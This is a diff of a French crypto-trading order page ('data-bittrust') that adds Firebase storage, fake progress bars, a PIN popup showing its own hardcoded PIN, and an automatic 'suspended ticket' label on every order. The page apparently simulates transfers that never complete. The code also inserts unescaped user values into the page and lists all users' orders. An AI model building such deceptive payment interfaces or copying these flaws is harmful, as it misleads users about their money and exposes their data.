@@ -30,55 +30,6 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 
     <style>
-        /* Ajoutez ces styles dans la section <style> */
-        .order-summary {
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-
-        .order-summary p {
-            margin-bottom: 8px;
-        }
-
-        .order-summary strong {
-            color: var(--dark-color);
-        }
-
-        /* Animation pour les cartes d'ordre */
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                transform: scale(1.02);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        .order-card {
-            animation: pulse 0.5s ease;
-        }
-
-        /* Styles pour le modal de confirmation */
-        .modal-content {
-            border-radius: 12px;
-            overflow: hidden;
-        }
-
-        .modal-header {
-            border-bottom: none;
-        }
-
-        .modal-footer {
-            border-top: none;
-        }
-
         :root {
             --primary-color: #0056b3;
             --secondary-color: #003366;
@@ -410,11 +361,466 @@
 
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <!-- Firebase SDK -->
-    <script type="module" src="firebase-config.js"></script>
 
-    <!-- Script de gestion des ordres -->
-    <script type="module" src="js/ordres.js"></script>
+    <!--  <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Gestion des boutons de type d'ordre
+            const orderTypeBtns = document.querySelectorAll('.order-type-btn');
+
+            orderTypeBtns.forEach(btn => {
+                btn.addEventListener('click', function () {
+                    orderTypeBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+
+                    // Ici vous filtreriez les ordres en fonction du type sélectionné
+                    const type = this.getAttribute('data-type');
+                    console.log(`Filtrer les ordres par type: ${type}`);
+                });
+            });
+
+            // Animation des cartes au survol
+            const cards = document.querySelectorAll('.card-style, .order-card');
+
+            cards.forEach(card => {
+                card.addEventListener('mouseenter', function () {
+                    this.style.transform = 'translateY(-5px)';
+                    this.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.1)';
+                });
+
+                card.addEventListener('mouseleave', function () {
+                    this.style.transform = '';
+                    this.style.boxShadow = '';
+                });
+            });
+
+            // Gestion des boutons de navigation
+            const navButtons = document.querySelectorAll('.nav-button');
+
+            navButtons.forEach(button => {
+                button.addEventListener('click', function (e) {
+                    if (!this.classList.contains('active')) {
+                        navButtons.forEach(btn => btn.classList.remove('active'));
+                        this.classList.add('active');
+                    }
+                });
+            });
+
+        });
+    </script>
+    
+
+    <script>
+        // Barre de progression et popup PIN
+        function showProgressAndPin(orderCard) {
+            // Créer la barre de progression
+            const progressDiv = document.createElement('div');
+            progressDiv.className = 'mt-3 w-100';
+            progressDiv.innerHTML = `
+                <div class="progress" style="height: 18px;">
+                    <div class="progress-bar progress-bar-striped progress-bar-animated" 
+                        role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
+                        0%
+                    </div>
+                </div>
+            `;
+            orderCard.appendChild(progressDiv);
+
+            const progressBar = progressDiv.querySelector('.progress-bar');
+            let progress = 0;
+            let interval = setInterval(() => {
+                progress += 2;
+                if (progress > 30) progress = 30;
+                progressBar.style.width = progress + '%';
+                progressBar.setAttribute('aria-valuenow', progress);
+                progressBar.textContent = progress + '%';
+                if (progress >= 30) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        showPinPopup();
+                    }, 300); // petite pause avant le popup
+                }
+            }, 100); // 100ms * 30 = 3s (après 5s d'attente initiale)
+
+            // Animation jusqu'à 30% après 5s
+            setTimeout(() => {
+                interval;
+            }, 0);
+        }
+
+        // Affichage du popup PIN
+        function showPinPopup() {
+            // Si déjà présent, ne pas dupliquer
+            if (document.getElementById('pinModal')) return;
+
+            const modalHtml = `
+            <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);" aria-modal="true" role="dialog">
+              <div class="modal-dialog modal-dialog-centered">
+                <div class="modal-content">
+                  <div class="modal-header">
+                    <h5 class="modal-title">Validation requise</h5>
+                  </div>
+                  <div class="modal-body">
+                    <p>Veuillez intégrer votre code PIN pour valider la transaction :</p>
+                    <input type="password" class="form-control mb-2" id="pinInput" maxlength="6" placeholder="Code PIN">
+                    <div id="pinError" class="text-danger" style="display:none;">Code PIN requis.</div>
+                  </div>
+                  <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" id="validatePinBtn">Valider</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+            `;
+            const modalDiv = document.createElement('div');
+            modalDiv.innerHTML = modalHtml;
+            document.body.appendChild(modalDiv);
+
+            // Focus sur l'input
+            setTimeout(() => {
+                document.getElementById('pinInput').focus();
+            }, 200);
+
+            // Validation du PIN
+            document.getElementById('validatePinBtn').onclick = function () {
+                const pin = document.getElementById('pinInput').value.trim();
+                if (!pin) {
+                    document.getElementById('pinError').style.display = 'block';
+                } else {
+                    document.getElementById('pinError').style.display = 'none';
+                    // Fermer le modal
+                    document.getElementById('pinModal').remove();
+                    modalDiv.remove();
+                    // Ici, vous pouvez ajouter la logique de validation réelle du PIN
+                }
+            };
+        }
+
+        // Récupération et affichage dynamique de la carte d'ordre lors de la soumission du formulaire
+        document.addEventListener('DOMContentLoaded', function () {
+            // Initialisation de l'état du formulaire
+            document.getElementById('orderType').dispatchEvent(new Event('change'));
+
+            // Gestion de la soumission du formulaire
+            const form = document.querySelector('form');
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                // Récupérer les valeurs du formulaire
+                const orderType = document.getElementById('orderType').value;
+                const asset = document.getElementById('assetSelect').value;
+                const assetText = document.getElementById('assetSelect').selectedOptions[0].textContent;
+                const amount = document.getElementById('amountInput').value;
+
+                // Déterminer le texte du type d'ordre
+                let typeLabel = '';
+                let typeClass = '';
+                switch (orderType) {
+                    case 'buy':
+                        typeLabel = 'Achat';
+                        typeClass = 'buy';
+                        break;
+                    case 'sell':
+                        typeLabel = 'Vente';
+                        typeClass = 'sell';
+                        break;
+                    case 'transfer':
+                        typeLabel = 'Transfert';
+                        typeClass = 'transfer';
+                        break;
+                    case 'limit':
+                        typeLabel = 'Prêt';
+                        typeClass = 'limit';
+                        break;
+                }
+
+                // Création de la carte d'ordre
+                const orderCard = document.createElement('div');
+                orderCard.className = `order-card ${typeClass} mb-3 p-3 d-flex align-items-center`;
+                orderCard.innerHTML = `
+                    <div class="flex-grow-1">
+                        <div class="fw-bold mb-1">${typeLabel} - ${assetText}</div>
+                        <div>Montant : <span class="fw-semibold">${amount}</span></div>
+                        <div class="text-warning mt-2"><i class="fas fa-spinner fa-spin me-1"></i>Transfert en cours</div>
+                    </div>
+                `;
+
+                // Afficher la carte dans la section des ordres en cours
+                const ordersContainer = document.querySelector('.orders-container');
+                // Retirer le message "Aucun ordre en cours" s'il existe
+                const noOrders = ordersContainer.querySelector('.no-orders');
+                if (noOrders) noOrders.remove();
+                // Ajouter la nouvelle carte d'ordre
+                ordersContainer.prepend(orderCard);
+
+                // Après 5s, afficher la barre de progression et le popup PIN à 30%
+                setTimeout(() => {
+                    showProgressAndPin(orderCard);
+                }, 5000);
+
+                // Réinitialiser le formulaire
+                form.reset();
+                document.getElementById('orderType').dispatchEvent(new Event('change'));
+            });
+        });
+
+        // Script de gestion du formulaire (déjà fourni)
+        document.getElementById('orderType').addEventListener('change', function () {
+            const orderType = this.value;
+            const assetSelect = document.getElementById('assetSelect');
+            const assetLabel = document.getElementById('assetLabel');
+            const amountLabel = document.getElementById('amountLabel');
+            const limitLabel = document.getElementById('limitLabel');
+            const limitInput = document.getElementById('limitInput');
+            const rateInfo = document.getElementById('rateInfo');
+
+            // Sauvegarder toutes les options au cas où
+            const allOptions = [
+                { value: 'btc', text: 'Bitcoin (BTC)' },
+                { value: 'eth', text: 'Ethereum (ETH)' },
+                { value: 'usdt', text: 'Tether (USDT)' },
+                { value: 'eur', text: 'Euro (EUR)' },
+                { value: 'usd', text: 'Dollar (USD)' },
+                { value: 'gbp', text: 'Livre Sterling (GBP)' }
+            ];
+
+            // Vider les options actuelles
+            assetSelect.innerHTML = '';
+
+            switch (orderType) {
+                case 'limit': // Prêt
+                    assetLabel.textContent = 'Solde principal';
+                    amountLabel.textContent = 'Montant du prêt';
+                    limitLabel.textContent = 'Total à rembourser';
+                    limitInput.readOnly = true;
+                    rateInfo.style.display = 'block';
+
+                    // Ajouter seulement EUR, USD, GBP
+                    const fiatCurrencies = allOptions.filter(opt =>
+                        ['eur', 'usd', 'gbp'].includes(opt.value)
+                    );
+
+                    fiatCurrencies.forEach(currency => {
+                        const option = document.createElement('option');
+                        option.value = currency.value;
+                        option.textContent = currency.text;
+                        assetSelect.appendChild(option);
+                    });
+
+                    // Activer le calcul automatique
+                    document.getElementById('amountInput').addEventListener('input', calculateRepayment);
+                    break;
+
+                case 'transfer': // Transfert
+                    assetLabel.textContent = 'Solde principal';
+                    amountLabel.textContent = 'Montant';
+                    limitLabel.textContent = 'Prix restant';
+                    limitInput.readOnly = false;
+                    rateInfo.style.display = 'none';
+
+                    // Ajouter toutes les options
+                    allOptions.forEach(currency => {
+                        const option = document.createElement('option');
+                        option.value = currency.value;
+                        option.textContent = currency.text;
+                        assetSelect.appendChild(option);
+                    });
+
+                    // Désactiver le calcul automatique
+                    document.getElementById('amountInput').removeEventListener('input', calculateRepayment);
+                    break;
+
+                case 'buy': // Achat
+                case 'sell': // Vente
+                    assetLabel.textContent = 'Choix de cryptomonnaie';
+                    amountLabel.textContent = 'Montant';
+                    limitLabel.textContent = 'Valeur exacte de la cryptomonnaie';
+                    limitInput.readOnly = false;
+                    rateInfo.style.display = 'none';
+
+                    // Ajouter seulement les cryptos (BTC, ETH, USDT)
+                    const cryptoCurrencies = allOptions.filter(opt =>
+                        ['btc', 'eth', 'usdt'].includes(opt.value)
+                    );
+
+                    cryptoCurrencies.forEach(currency => {
+                        const option = document.createElement('option');
+                        option.value = currency.value;
+                        option.textContent = currency.text;
+                        assetSelect.appendChild(option);
+                    });
+
+                    // Désactiver le calcul automatique
+                    document.getElementById('amountInput').removeEventListener('input', calculateRepayment);
+                    break;
+            }
+        });
+
+        // Fonction de calcul automatique du remboursement
+        function calculateRepayment() {
+            const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+            const repaymentAmount = amount * 1.03; // Ajout des 3%
+            document.getElementById('limitInput').value = repaymentAmount.toFixed(2);
+        }
+    </script>
+     -->
+
+    <!-- @hopsyder - Interface de gestion des ordres avec validation, progression, sécurité et Firebase -->
+
+<!-- Connexion Firebase et gestion des ordres -->
+    <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
+    import {
+      getFirestore, collection, addDoc, onSnapshot, query, orderBy, serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
+    import {
+      getAuth, onAuthStateChanged
+    } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-auth.js";
+    
+    const firebaseConfig = {
+      apiKey: "AIzaSyDVycudiPGxEe60Ulw8991VUUj8_n8uJn8",
+      authDomain: "data-bittrust.firebaseapp.com",
+      projectId: "data-bittrust",
+      storageBucket: "data-bittrust.firebasestorage.app",
+      messagingSenderId: "279615547784",
+      appId: "1:279615547784:web:624a233334d4a6b382f23d"
+    };
+    
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const auth = getAuth(app);
+    
+    let currentUserId = null;
+    
+    onAuthStateChanged(auth, user => {
+      if (!user) {
+        window.location.href = "connexion.html";
+      } else {
+        currentUserId = user.uid;
+        loadOrders();
+      }
+    });
+    
+    function loadOrders() {
+      const container = document.querySelector(".orders-container");
+      const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
+      onSnapshot(q, snapshot => {
+        container.innerHTML = "";
+        if (snapshot.empty) {
+          container.innerHTML = `<div class="no-orders">
+            <i class="fas fa-exchange-alt"></i>
+            <h4 class="mt-3" style="color: #fff;">Aucun ordre en cours</h4>
+            </div>`;
+        } else {
+          snapshot.forEach(doc => {
+            const d = doc.data();
+            const card = document.createElement("div");
+            card.className = "order-card mb-3 p-3 bg-light";
+            card.innerHTML = `
+            <div class="fw-bold mb-1">${d.typeLabel} - ${d.assetLabel}</div>
+            <div>Montant : <span class="fw-semibold">${d.amount}</span></div>
+            <div><small>${new Date(d.timestamp.toDate()).toLocaleString()}</small></div>
+            <div class="text-end mt-2 text-danger fw-bold">TICKET DE SUSPENDU</div>
+            `;
+            container.appendChild(card);
+          });
+        }
+      });
+    }
+    
+    window.submitOrderToFirestore = async function(orderData, card, progressBar) {
+      try {
+        orderData.timestamp = serverTimestamp();
+        orderData.userId = currentUserId;
+        await addDoc(collection(db, "orders"), orderData);
+        progressBar.style.width = "97%";
+        progressBar.textContent = "97%";
+        progressBar.setAttribute('aria-valuenow', 97);
+        setTimeout(() => {
+          card.innerHTML += `<div class='text-end mt-2 text-danger fw-bold'>TICKET DE SUSPENDU</div>`;
+        }, 500);
+      } catch (e) {
+        alert("Erreur Firebase: " + e.message);
+      }
+    };
+    
+    window.showProgressAndPin = function(orderData) {
+      const container = document.querySelector('.orders-container');
+      const card = document.createElement('div');
+      card.className = 'order-card mb-3 p-3 bg-light';
+      card.innerHTML = `<div><b>${orderData.typeLabel} - ${orderData.assetLabel}</b><br>Montant: ${orderData.amount}</div>`;
+      container.prepend(card);
+    
+      const progressHTML = `
+        <div class="progress mt-3">
+          <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">0%</div>
+        </div>`;
+      card.insertAdjacentHTML("beforeend", progressHTML);
+      const progressBar = card.querySelector(".progress-bar");
+      
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += 2;
+        if (progress > 30) progress = 30;
+        progressBar.style.width = `${progress}%`;
+        progressBar.textContent = `${progress}%`;
+        progressBar.setAttribute('aria-valuenow', progress);
+        if (progress === 30) {
+          clearInterval(interval);
+          showPinPopup(orderData, card, progressBar);
+        }
+      }, 100);
+    };
+    
+    window.showPinPopup = function(orderData, card, progressBar) {
+      if (document.getElementById('pinModal')) return;
+    
+      const modal = document.createElement('div');
+      modal.innerHTML = `
+        <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header"><h5 class="modal-title">Validation requise</h5></div>
+              <div class="modal-body">
+                <p>Veuillez entrer le code PIN : <strong>BT34C67</strong></p>
+                <input type="password" id="pinInput" class="form-control mb-2" maxlength="8">
+                <div class="text-danger" id="pinError" style="display:none;">Code incorrect.</div>
+              </div>
+              <div class="modal-footer">
+                <button class="btn btn-primary" id="validatePinBtn">Valider</button>
+              </div>
+            </div>
+          </div>
+        </div>`;
+    
+      document.body.appendChild(modal);
+    
+      document.getElementById('validatePinBtn').onclick = () => {
+        const pin = document.getElementById('pinInput').value.trim();
+        if (pin !== "BT34C67") {
+          document.getElementById('pinError').style.display = 'block';
+        } else {
+          document.getElementById('pinModal').remove();
+          modal.remove();
+          progressBar.classList.remove("progress-bar-animated");
+    
+          let progress = 30;
+          const interval = setInterval(() => {
+            progress += 2;
+            if (progress >= 97) {
+              progress = 97;
+              clearInterval(interval);
+              window.submitOrderToFirestore(orderData, card, progressBar);
+            }
+            progressBar.style.width = `${progress}%`;
+            progressBar.textContent = `${progress}%`;
+            progressBar.setAttribute('aria-valuenow', progress);
+          }, 50);
+        }
+      };
+    };
+    </script>
+    
+
 
 </body>
 
